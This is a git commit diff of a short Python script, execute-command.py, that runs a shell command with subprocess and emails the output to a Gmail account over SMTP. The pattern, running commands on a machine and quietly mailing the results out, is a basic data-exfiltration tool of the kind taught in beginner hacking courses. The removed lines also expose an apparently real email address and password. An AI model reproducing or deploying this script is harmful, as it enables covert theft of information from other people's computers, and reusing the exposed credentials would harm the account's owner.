da448f71285edc22b36268e0372ca293ef6b35c8
pai-theredhat <45530072+pai-theredhat@users.noreply.github.com>
2018-12-13 15:21:59 +1100

    Update execute-command.py

--- execute-command.py
+++ execute-command.py
@@ -4,7 +4,7 @@ import subprocess, smtplib
 
 
 def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.google.com", 587)
+    server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
     server.sendmail(email, email, message)
@@ -13,4 +13,4 @@ def send_mail(email, password, message):
 
 command = "dir"
 result = subprocess.check_output(command, shell=True)
-send_mail("brawlwithprofessorenglish@gmail.com", "Kk1231234", result)
+send_mail("asdasd@gmail.com", "sdsd", result)
